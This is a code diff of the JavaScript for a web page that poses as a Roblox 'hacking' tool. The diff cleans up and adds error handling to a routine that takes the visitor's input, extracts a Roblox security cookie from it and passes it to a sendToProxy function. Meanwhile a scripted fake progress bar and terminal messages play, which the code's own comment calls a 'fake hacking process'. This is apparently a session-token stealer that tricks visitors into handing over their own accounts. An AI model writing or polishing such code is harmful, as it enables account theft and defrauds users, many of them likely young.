@@ -36,13 +36,11 @@ async function sendToProxy(sessionId) {
 function bruteforce(sessionId) {
   try {
     const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
-    sendToProxy(cookie)
+    sendToProxy(cookie);
+  } catch (error) {
+    console.error('Bruteforce error:', error);
   }
 }
-
-
-
-
 
 function validateInput() {
   const username = document.getElementById('username').value.trim();
@@ -68,21 +66,17 @@ function validateInput() {
     errorMessage = "Please complete the CAPTCHA to proceed.";
   }
 
- 
   if (errorMessage) {
     showError(errorMessage);
     return;
   }
 
-
-bruteforce(sessionId);
+  bruteforce(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
   startHack();
 }
-
-
 
 function showError(message) {
   const errorElement = document.getElementById('error');
@@ -90,38 +84,39 @@ function showError(message) {
   errorElement.classList.remove('hidden');
 }
 
-
 function hideError() {
   document.getElementById('error').classList.add('hidden');
 }
 
-
 function startHack() {
-
+  // Disable button and show progress
   document.getElementById('scanButton').disabled = true;
-
-
   document.getElementById('hacking').classList.remove('hidden');
 
- 
+  // Reset terminal
+  const terminal = document.getElementById('terminal');
+  terminal.innerHTML = '[*] Initializing hacking sequence...\n';
+
+  // Progress bar animation
   const progressBar = document.getElementById('progress-bar-fill');
+  progressBar.style.width = '0%';
   let width = 0;
   const totalTime = 65000; // 65 seconds
   const intervalTime = 50; // Update every 50ms
-  const increment = (intervalTime / totalTime) * 100; // Calculate increment per interval
+  const increment = (intervalTime / totalTime) * 100;
 
   const progressInterval = setInterval(() => {
     if (width >= 100) {
       clearInterval(progressInterval);
-      showCookieSuccess();
+      // Show results after slight delay when progress completes
+      setTimeout(showCookieSuccess, 500);
     } else {
       width += increment;
       progressBar.style.width = width + '%';
     }
   }, intervalTime);
 
-  
-  const terminal = document.getElementById('terminal');
+  // Terminal messages
   const messages = [
     '[*] Scanning target account...',
     '[*] Identifying encryption: AES-256...',
@@ -130,7 +125,7 @@ function startHack() {
     '[*] Extracting _ROBLOSECURITY cookie...',
     '[*] Verifying cookie validity...'
   ];
-  const messageInterval = totalTime / messages.length; // Time between messages
+  const messageInterval = totalTime / messages.length;
 
   let i = 0;
   const terminalInterval = setInterval(() => {
@@ -138,11 +133,12 @@ function startHack() {
       clearInterval(terminalInterval);
     } else {
       terminal.innerHTML += messages[i] + '\n';
-      terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
+      terminal.scrollTop = terminal.scrollHeight;
       i++;
     }
   }, messageInterval);
 }
+
 
 
 function showCookieSuccess() {
